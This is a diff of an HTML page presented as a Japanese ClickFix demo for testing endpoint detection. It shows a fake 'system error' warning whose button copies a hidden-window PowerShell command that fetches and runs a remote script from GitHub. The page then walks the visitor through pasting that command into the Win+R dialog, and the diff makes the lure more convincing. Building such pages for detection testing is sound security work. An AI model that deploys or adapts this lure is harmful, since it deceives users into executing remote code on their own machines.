@@ -1,50 +1,181 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ClickFixデモサイト</title>
+    <meta charset="UTF-8">
+    <title>ClickFixデモ</title>
     <style>
-        body { font-family: Arial, sans-serif; padding: 50px; background: #f0f0f0; }
-        .header { text-align: center; margin-bottom: 30px; }
-        .header h1 { color: #333; font-size: 28px; margin-bottom: 10px; }
-        .header p { color: #666; font-size: 14px; }
-        .container { background: white; padding: 40px; border-radius: 10px; max-width: 700px; margin: auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .warning-icon { font-size: 48px; margin-bottom: 20px; }
-        .error { color: red; font-weight: bold; margin-bottom: 20px; font-size: 20px; }
-        .fix-button { background: #0078d4; color: white; padding: 15px 40px; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; font-weight: bold; }
-        .fix-button:hover { background: #005a9e; }
+        body { 
+            font-family: 'Segoe UI', Arial, sans-serif; 
+            padding: 50px; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+        }
+        .header { 
+            text-align: center; 
+            margin-bottom: 30px; 
+            color: white;
+        }
+        .header h1 { 
+            font-size: 32px; 
+            margin-bottom: 10px; 
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        .header p { 
+            font-size: 16px; 
+            opacity: 0.9;
+        }
+        .container { 
+            background: white; 
+            padding: 40px; 
+            border-radius: 15px; 
+            max-width: 700px; 
+            margin: auto; 
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3); 
+        }
+        .warning-section {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .warning-icon { 
+            font-size: 64px; 
+            margin-bottom: 15px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        .warning-section h2 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .error { 
+            color: #d32f2f; 
+            font-weight: bold; 
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+        .instruction-text {
+            color: #555;
+            font-size: 16px;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        .fix-button { 
+            background: linear-gradient(135deg, #0078d4 0%, #005a9e 100%);
+            color: white; 
+            padding: 18px 50px; 
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-size: 18px; 
+            font-weight: bold;
+            display: block;
+            margin: 0 auto 20px auto;
+            box-shadow: 0 4px 15px rgba(0,120,212,0.4);
+            transition: all 0.3s;
+        }
+        .fix-button:hover { 
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0,120,212,0.6);
+        }
+        .fix-button:active {
+            transform: translateY(0);
+        }
         .command-box { display: none; }
-        .copied { color: green; margin-top: 15px; display: none; font-weight: bold; }
-        .instructions { margin-top: 30px; font-size: 14px; color: #333; line-height: 1.8; }
-        .instructions ol { padding-left: 20px; }
+        .copied { 
+            color: #4caf50; 
+            margin-top: 15px; 
+            display: none; 
+            font-weight: bold;
+            text-align: center;
+            font-size: 16px;
+        }
+        .copied::before {
+            content: "✓ ";
+            font-size: 20px;
+        }
+        .instructions { 
+            margin-top: 40px; 
+            padding: 25px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            border-left: 4px solid #0078d4;
+        }
+        .instructions h3 {
+            color: #333;
+            font-size: 18px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+        }
+        .instructions h3::before {
+            content: "📋";
+            margin-right: 10px;
+            font-size: 24px;
+        }
+        .step {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+            font-size: 15px;
+            color: #555;
+        }
+        .step-icon {
+            font-size: 24px;
+            margin-right: 12px;
+            min-width: 30px;
+        }
+        .keyboard-shortcut {
+            display: inline-block;
+            background: #333;
+            color: white;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            margin: 0 4px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>ClickFixデモサイト</h1>
+        <h1>🔧 ClickFixデモ</h1>
         <p>EDR検知テスト用デモサイト</p>
     </div>
     
     <div class="container">
-        <div class="warning-icon">⚠️</div>
-        <h2>システムエラーが検出されました</h2>
-        <p class="error">重要なシステムコンポーネントの更新が必要です</p>
-        <p>以下のボタンをクリックして修正コマンドをコピーしてください：</p>
+        <div class="warning-section">
+            <div class="warning-icon">⚠️</div>
+            <h2>システムエラーが検出されました</h2>
+            <p class="error">重要なシステムコンポーネントの更新が必要です</p>
+        </div>
+        
+        <p class="instruction-text">以下のボタンをクリックして修正を実行してください</p>
         
         <div class="command-box" id="command">
 powershell -w hidden -c "iex(iwr 'https://raw.githubusercontent.com/choro511/detection-testing/refs/heads/main/test1_basic_info.ps1' -UseBasicParsing)"
         </div>
         
-        <button class="fix-button" onclick="copyCommand()">修正コマンドをコピー</button>
-        <div class="copied" id="copied">✓ コマンドをコピーしました！</div>
+        <button class="fix-button" onclick="copyCommand()">🔄 修正を実行</button>
+        <div class="copied" id="copied">コマンドをコピーしました！</div>
         
         <div class="instructions">
-            <strong>手順：</strong>
-            <ol>
-                <li>上記ボタンをクリック</li>
-                <li>Windows キー + R を押す</li>
-                <li>"powershell" と入力して Enter</li>
-                <li>コピーしたコマンドを貼り付けて Enter</li>
-            </ol>
+            <h3>実行手順</h3>
+            <div class="step">
+                <span class="step-icon">1️⃣</span>
+                <span>上記ボタンをクリック</span>
+            </div>
+            <div class="step">
+                <span class="step-icon">2️⃣</span>
+                <span><span class="keyboard-shortcut">Windows</span>+<span class="keyboard-shortcut">R</span> を押す</span>
+            </div>
+            <div class="step">
+                <span class="step-icon">3️⃣</span>
+                <span><span class="keyboard-shortcut">Ctrl</span>+<span class="keyboard-shortcut">V</span> で貼り付けて Enter</span>
+            </div>
         </div>
     </div>
     
@@ -52,12 +183,13 @@ powershell -w hidden -c "iex(iwr 'https://raw.githubusercontent.com/choro511/det
         function copyCommand() {
             const command = document.getElementById('command').textContent.trim();
             navigator.clipboard.writeText(command).then(() => {
-                document.getElementById('copied').style.display = 'block';
+                const copiedMsg = document.getElementById('copied');
+                copiedMsg.style.display = 'block';
                 setTimeout(() => {
-                    document.getElementById('copied').style.display = 'none';
+                    copiedMsg.style.display = 'none';
                 }, 3000);
             }).catch(err => {
-                alert('コピーに失敗しました。手動でコマンドをコピーしてください。');
+                alert('❌ コピーに失敗しました。手動でコマンドをコピーしてください。');
             });
         }
     </script>
